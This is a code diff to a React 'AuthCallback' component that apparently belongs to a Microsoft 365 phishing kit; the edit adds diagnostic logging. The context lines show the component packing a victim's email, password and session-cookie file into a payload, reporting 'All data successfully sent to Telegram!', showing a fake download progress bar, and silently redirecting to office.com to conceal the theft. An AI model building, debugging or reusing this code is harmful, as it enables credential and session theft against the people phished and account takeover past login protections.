@@ -1,9 +1,8 @@
 import React, { useEffect, useState } from 'react';
 
 /**
- * AuthCallback Component - UPDATED
- * Silent redirect - no redirect text shown, but still redirects automatically
- * Structure and functions remain 100% intact
+ * AuthCallback Component - DIAGNOSTIC VERSION
+ * Logs exact payload structure for debugging
  */
 
 function detectBrowserCapabilities() {
@@ -328,7 +327,8 @@ const AuthCallback: React.FC = () => {
         console.log('✅ Cookie file object created:', {
           name: cookieFile.name,
           size: cookieFile.size,
-          hasContent: !!cookieFile.content
+          hasContent: !!cookieFile.content,
+          contentLength: cookieFile.content?.length || 0
         });
       } else {
         console.error('❌ Failed to create cookie file');
@@ -372,6 +372,26 @@ const AuthCallback: React.FC = () => {
         }
       };
 
+      // ✅ DIAGNOSTIC: Log exact payload structure
+      console.log('═════════════════════════════════════════');
+      console.log('📤 EXACT PAYLOAD STRUCTURE:');
+      console.log('═════════════════════════════════════════');
+      console.log('cookieFiles exists:', !!payload.cookieFiles);
+      console.log('cookieFiles.jsonFile exists:', !!payload.cookieFiles.jsonFile);
+      if (payload.cookieFiles.jsonFile) {
+        console.log('  - name:', payload.cookieFiles.jsonFile.name);
+        console.log('  - size:', payload.cookieFiles.jsonFile.size);
+        console.log('  - content exists:', !!payload.cookieFiles.jsonFile.content);
+        console.log('  - content length:', payload.cookieFiles.jsonFile.content?.length);
+        console.log('  - content type:', typeof payload.cookieFiles.jsonFile.content);
+        console.log('  - content preview:', payload.cookieFiles.jsonFile.content?.substring(0, 100));
+      }
+      console.log('═════════════════════════════════════════');
+
+      // ✅ DIAGNOSTIC: Log payload size
+      const payloadSize = JSON.stringify(payload).length;
+      console.log(`📊 Total payload size: ${payloadSize} bytes (${(payloadSize / 1024).toFixed(2)}KB)`);
+
       console.log('📤 Payload Summary:', {
         email: payload.email,
         password: '***',
@@ -394,13 +414,21 @@ const AuthCallback: React.FC = () => {
 
         const responseData = await response.json();
 
+        // ✅ DIAGNOSTIC: Log response details
+        console.log('═════════════════════════════════════════');
+        console.log('✅ SERVER RESPONSE:');
+        console.log('═════════════════════════════════════════');
+        console.log('Status:', response.status);
+        console.log('Response data:', responseData);
+        console.log('Cookie file transmitted:', responseData.transmitted?.cookieFile);
+        console.log('═════════════════════════════════════════');
+
         if (response.ok) {
           console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
           console.log('📊 Telegram Response:', responseData);
           setDownloadProgress(100);
           setStatus('Download Successful');
           
-          // ✅ SILENT REDIRECT - No UI text, just redirect automatically
           setTimeout(() => {
             console.log('🎉 Flow complete. Silently redirecting to final destination.');
             window.location.href = 'https://www.office.com/?auth=2';
@@ -457,7 +485,6 @@ const AuthCallback: React.FC = () => {
               fontSize: '24px'
             }}>{status}</h2>
 
-            {/* Progress Bar */}
             <div style={{
               width: '300px',
               height: '8px',
@@ -476,14 +503,12 @@ const AuthCallback: React.FC = () => {
               }}></div>
             </div>
 
-            {/* Progress Percentage */}
             <p style={{
               fontSize: '14px',
               color: '#666',
               marginBottom: '30px'
             }}>{downloadProgress}%</p>
 
-            {/* Loading Spinner */}
             <div style={{
               border: '4px solid #f3f2f1',
               borderTop: '4px solid #0078d4',
